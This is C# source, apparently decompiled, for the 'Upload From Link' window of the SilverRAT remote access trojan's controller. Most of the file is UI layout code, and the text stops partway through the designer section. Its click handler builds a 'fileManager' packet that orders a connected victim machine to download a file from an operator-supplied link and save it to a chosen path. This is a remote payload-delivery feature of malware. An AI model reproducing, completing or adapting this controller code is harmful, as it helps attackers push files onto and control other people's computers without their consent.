using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Connection;
using SilverRAT.MessagePack;
using System;
using System.ComponentModel;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class UploadFromLink : Form
{
    public bool IsConnected = false;

    private IContainer components = null;

    private BunifuElipse FormElipse;

    private BunifuDragControl FormDragControl1;

    private System.Windows.Forms.Timer Timer1;

    private Panel panelForm;

    private BunifuLabel bunifuLabel3;

    private BunifuPanel PanelTitle;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private PictureBox pictureBox1;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    public Guna2GradientButton UploadFile;

    public Bunifu.UI.WinForms.BunifuProgressBar ProgressBar1;

    private System.Windows.Forms.Timer Timer2;

    public BunifuTextBox TextBoxLink;

    public BunifuTextBox TextBox1Name;

    public BunifuLabel FileSave;

    public BunifuLoader LoaderConnect;

    internal Clients Client { get; set; }

    public string Info { get; set; }

    public string PatshSave { get; set; }

    public string HWID { get; set; }

    public int Complete { get; set; }

    public UploadFromLink()
    {
        InitializeComponent();
        MinimumSize = base.Size;
        MaximumSize = base.Size;
    }

    private void UploadFromLink_Load(object sender, EventArgs e)
    {
        UserIdInfo.Text = Info;
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
        }
        catch
        {
        }
    }

    private void UploadFromLink_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void UploadFromLink_FormClosing(object sender, FormClosingEventArgs e)
    {
        Program.Silver.TransitionHiddeng.HideSync(panelForm);
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!Client.TcpClient.Connected)
            {
                Close();
            }
        }
        catch
        {
        }
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
        if (!IsConnected)
        {
            return;
        }
        try
        {
            ProgressBar1.Value = Complete;
            if (Complete == 100)
            {
                UploadFile.Enabled = true;
                TextBox1Name.Enabled = true;
                TextBoxLink.Enabled = true;
                UploadFile.Text = "Finish";
                Timer2.Stop();
                Program.Silver.TransitionHiddeng.HideSync(panelForm);
                Close();
            }
        }
        catch
        {
        }
    }

    private void UploadFile_Click(object sender, EventArgs e)
    {
        try
        {
            if (!UploadFile.Text.Contains("Finish"))
            {
                UploadFile.Enabled = false;
                TextBox1Name.Enabled = false;
                UploadFile.Text = "Please wait...";
                TextBoxLink.Enabled = false;
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "fileManager";
                msgPack.ForcePathObject("Command").AsString = "Uploadink";
                msgPack.ForcePathObject("LNK").AsString = TextBoxLink.Text;
                msgPack.ForcePathObject("Save").AsString = FileSave.Text;
                msgPack.ForcePathObject("DWID").AsString = HWID;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void TextBox1Name_TextChange(object sender, EventArgs e)
    {
        string text = PatshSave + TextBox1Name.Text;
        FileSave.Text = text;
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.UploadFromLink));
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.FileSave = new Bunifu.UI.WinForms.BunifuLabel();
        this.ProgressBar1 = new Bunifu.UI.WinForms.BunifuProgressBar();
        this.bunifuLabel3 = new Bunifu.UI.WinForms.BunifuLabel();
        this.TextBox1Name = new Bunifu.UI.WinForms.BunifuTextBox();
        this.TextBoxLink = new Bunifu.UI.WinForms.BunifuTextBox();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.LoaderConnect = new Bunifu.UI.WinForms.BunifuLoader();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.pictureBox1 = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.UploadFile = new Guna.UI2.WinForms.Guna2GradientButton();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.Timer1 = new System.Windows.Forms.Timer(this.components);
        this.Timer2 = new System.Windows.Forms.Timer(this.components);
        this.panelForm.SuspendLayout();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
        base.SuspendLayout();
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.FileSave);
        this.panelForm.Controls.Add(this.ProgressBar1);
        this.panelForm.Controls.Add(this.bunifuLabel3);
        this.panelForm.Controls.Add(this.TextBox1Name);
        this.panelForm.Controls.Add(this.TextBoxLink);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Controls.Add(this.UploadFile);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(662, 257);
        this.panelForm.TabIndex = 572;
        this.panelForm.Visible = false;
        this.FileSave.AllowParentOverrides = false;
        this.FileSave.AutoEllipsis = false;
        this.FileSave.AutoSize = false;
        this.FileSave.Cursor = System.Windows.Forms.Cursors.Default;
        this.FileSave.CursorType = System.Windows.Forms.Cursors.Default;
        this.FileSave.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.FileSave.ForeColor = System.Drawing.Color.DarkGray;
        this.FileSave.Location = new System.Drawing.Point(135, 185);
        this.FileSave.Name = "FileSave";
        this.FileSave.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.FileSave.Size = new System.Drawing.Size(504, 15);
        this.FileSave.TabIndex = 609;
        this.FileSave.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.FileSave.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ProgressBar1.AllowAnimations = false;
        this.ProgressBar1.Animation = 0;
        this.ProgressBar1.AnimationSpeed = 220;
        this.ProgressBar1.AnimationStep = 10;
        this.ProgressBar1.BackColor = System.Drawing.Color.White;
        this.ProgressBar1.BackgroundImage = (System.Drawing.Image)resources.GetObject("ProgressBar1.BackgroundImage");
        this.ProgressBar1.BorderColor = System.Drawing.Color.Silver;
        this.ProgressBar1.BorderRadius = 1;
        this.ProgressBar1.BorderThickness = 1;
        this.ProgressBar1.Location = new System.Drawing.Point(29, 149);
        this.ProgressBar1.Maximum = 100;
        this.ProgressBar1.MaximumValue = 100;
        this.ProgressBar1.Minimum = 0;
        this.ProgressBar1.MinimumValue = 0;
        this.ProgressBar1.Name = "ProgressBar1";
        this.ProgressBar1.Orientation = System.Windows.Forms.Orientation.Horizontal;
        this.ProgressBar1.ProgressBackColor = System.Drawing.Color.White;
        this.ProgressBar1.ProgressColorLeft = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ProgressBar1.ProgressColorRight = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ProgressBar1.Size = new System.Drawing.Size(612, 25);
        this.ProgressBar1.TabIndex = 608;
        this.ProgressBar1.Value = 0;
        this.ProgressBar1.ValueByTransition = 0;
        this.bunifuLabel3.AllowParentOverrides = false;
        this.bunifuLabel3.AutoEllipsis = false;
        this.bunifuLabel3.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel3.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel3.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.bunifuLabel3.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel3.Location = new System.Drawing.Point(29, 185);
        this.bunifuLabel3.Name = "bunifuLabel3";
        this.bunifuLabel3.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel3.Size = new System.Drawing.Size(100, 15);
        this.bunifuLabel3.TabIndex = 606;
        this.bunifuLabel3.Text = "File Save  Location :";
        this.bunifuLabel3.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel3.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.TextBox1Name.AcceptsReturn = false;
        this.TextBox1Name.AcceptsTab = false;
        this.TextBox1Name.AnimationSpeed = 200;
        this.TextBox1Name.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TextBox1Name.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TextBox1Name.AutoSizeHeight = true;
        this.TextBox1Name.BackColor = System.Drawing.Color.Transparent;
        this.TextBox1Name.BackgroundImage = (System.Drawing.Image)resources.GetObject("TextBox1Name.BackgroundImage");
        this.TextBox1Name.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.TextBox1Name.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.TextBox1Name.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.TextBox1Name.BorderColorIdle = System.Drawing.Color.Silver;
        this.TextBox1Name.BorderRadius = 2;
        this.TextBox1Name.BorderThickness = 1;
        this.TextBox1Name.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TextBox1Name.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TextBox1Name.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.TextBox1Name.DefaultText = "";
        this.TextBox1Name.FillColor = System.Drawing.Color.White;
        this.TextBox1Name.HideSelection = true;
        this.TextBox1Name.IconLeft = null;
        this.TextBox1Name.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextBox1Name.IconPadding = 10;
        this.TextBox1Name.IconRight = null;
        this.TextBox1Name.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextBox1Name.Lines = new string[0];
        this.TextBox1Name.Location = new System.Drawing.Point(505, 116);
        this.TextBox1Name.MaxLength = 32767;
        this.TextBox1Name.MinimumSize = new System.Drawing.Size(1, 1);
        this.TextBox1Name.Modified = false;
        this.TextBox1Name.Multiline = false;
        this.TextBox1Name.Name = "TextBox1Name";
        stateProperties.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties.FillColor = System.Drawing.Color.Empty;
        stateProperties.ForeColor = System.Drawing.Color.Empty;
        stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextBox1Name.OnActiveState = stateProperties;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TextBox1Name.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextBox1Name.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextBox1Name.OnIdleState = stateProperties4;
        this.TextBox1Name.Padding = new System.Windows.Forms.Padding(3);
        this.TextBox1Name.PasswordChar = '\0';
        this.TextBox1Name.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TextBox1Name.PlaceholderText = "Filename";
        this.TextBox1Name.ReadOnly = false;
        this.TextBox1Name.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TextBox1Name.SelectedText = "";
        this.TextBox1Name.SelectionLength = 0;
        this.TextBox1Name.SelectionStart = 0;
        this.TextBox1Name.ShortcutsEnabled = true;
        this.TextBox1Name.Size = new System.Drawing.Size(134, 28);
        this.TextBox1Name.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TextBox1Name.TabIndex = 603;
        this.TextBox1Name.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TextBox1Name.TextMarginBottom = 0;
        this.TextBox1Name.TextMarginLeft = 3;
        this.TextBox1Name.TextMarginTop = 1;
        this.TextBox1Name.TextPlaceholder = "Filename";
        this.TextBox1Name.UseSystemPasswordChar = false;
        this.TextBox1Name.WordWrap = true;
        this.TextBox1Name.TextChange += new System.EventHandler(TextBox1Name_TextChange);
        this.TextBoxLink.AcceptsReturn = false;
        this.TextBoxLink.AcceptsTab = false;
        this.TextBoxLink.AnimationSpeed = 200;
        this.TextBoxLink.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TextBoxLink.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TextBoxLink.AutoSizeHeight = true;
        this.TextBoxLink.BackColor = System.Drawing.Color.Transparent;
        this.TextBoxLink.BackgroundImage = (System.Drawing.Image)resources.GetObject("TextBoxLink.BackgroundImage");
        this.TextBoxLink.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.TextBoxLink.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.TextBoxLink.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.TextBoxLink.BorderColorIdle = System.Drawing.Color.Silver;
        this.TextBoxLink.BorderRadius = 2;
        this.TextBoxLink.BorderThickness = 1;
        this.TextBoxLink.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TextBoxLink.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TextBoxLink.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.TextBoxLink.DefaultText = "";
        this.TextBoxLink.FillColor = System.Drawing.Color.White;
        this.TextBoxLink.HideSelection = true;
        this.TextBoxLink.IconLeft = null;
        this.TextBoxLink.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextBoxLink.IconPadding = 10;
        this.TextBoxLink.IconRight = null;
        this.TextBoxLink.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextBoxLink.Lines = new string[0];
        this.TextBoxLink.Location = new System.Drawing.Point(29, 116);
        this.TextBoxLink.MaxLength = 32767;
        this.TextBoxLink.MinimumSize = new System.Drawing.Size(1, 1);
        this.TextBoxLink.Modified = false;
        this.TextBoxLink.Multiline = false;
        this.TextBoxLink.Name = "TextBoxLink";
        stateProperties5.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties5.FillColor = System.Drawing.Color.Empty;
        stateProperties5.ForeColor = System.Drawing.Color.Empty;
        stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextBoxLink.OnActiveState = stateProperties5;
        stateProperties6.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties6.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties6.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TextBoxLink.OnDisabledState = stateProperties6;
        stateProperties7.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties7.FillColor = System.Drawing.Color.Empty;
        stateProperties7.ForeColor = System.Drawing.Color.Empty;
        stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextBoxLink.OnHoverState = stateProperties7;
        stateProperties8.BorderColor = System.Drawing.Color.Silver;
        stateProperties8.FillColor = System.Drawing.Color.White;
        stateProperties8.ForeColor = System.Drawing.Color.Empty;
        stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextBoxLink.OnIdleState = stateProperties8;
        this.TextBoxLink.Padding = new System.Windows.Forms.Padding(3);
        this.TextBoxLink.PasswordChar = '\0';
        this.TextBoxLink.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TextBoxLink.PlaceholderText = "Direct link";
        this.TextBoxLink.ReadOnly = false;
        this.TextBoxLink.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TextBoxLink.SelectedText = "";
        this.TextBoxLink.SelectionLength = 0;
        this.TextBoxLink.SelectionStart = 0;
        this.TextBoxLink.ShortcutsEnabled = true;
        this.TextBoxLink.Size = new System.Drawing.Size(470, 28);
        this.TextBoxLink.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TextBoxLink.TabIndex = 602;
        this.TextBoxLink.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TextBoxLink.TextMarginBottom = 0;
        this.TextBoxLink.TextMarginLeft = 3;
        this.TextBoxLink.TextMarginTop = 1;
        this.TextBoxLink.TextPlaceholder = "Direct link";
        this.TextBoxLink.UseSystemPasswordChar = false;
        this.TextBoxLink.WordWrap = true;
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.LoaderConnect);
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.pictureBox1);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(632, 77);
        this.PanelTitle.TabIndex = 596;
        this.LoaderConnect.AllowStylePresets = true;
        this.LoaderConnect.BackColor = System.Drawing.Color.Transparent;
        this.LoaderConnect.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.LoaderConnect.Color = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LoaderConnect.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.LoaderConnect.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.LoaderConnect.Customization = "";
        this.LoaderConnect.DashWidth = 0.5f;
        this.LoaderConnect.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LoaderConnect.Image = null;
        this.LoaderConnect.Location = new System.Drawing.Point(12, 13);
        this.LoaderConnect.Name = "LoaderConnect";
        this.LoaderConnect.NoRounding = false;
        this.LoaderConnect.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
        this.LoaderConnect.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.LoaderConnect.ShowText = false;
        this.LoaderConnect.Size = new System.Drawing.Size(54, 50);
        this.LoaderConnect.Speed = 7;
        this.LoaderConnect.TabIndex = 597;
        this.LoaderConnect.Text = "bunifuLoader1";
        this.LoaderConnect.TextPadding = new System.Windows.Forms.Padding(0);
        this.LoaderConnect.Thickness = 6;
        this.LoaderConnect.Transparent = true;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(602, 13);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(579, 13);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(10, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(107, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Upload From Link";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.pictureBox1.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
        this.pictureBox1.Location = new System.Drawing.Point(10, 13);
        this.pictureBox1.Name = "pictureBox1";
        this.pictureBox1.Size = new System.Drawing.Size(59, 50);
        this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox1.TabIndex = 570;
        this.pictureBox1.TabStop = false;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 246);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(329, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 96);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 104);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(329, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
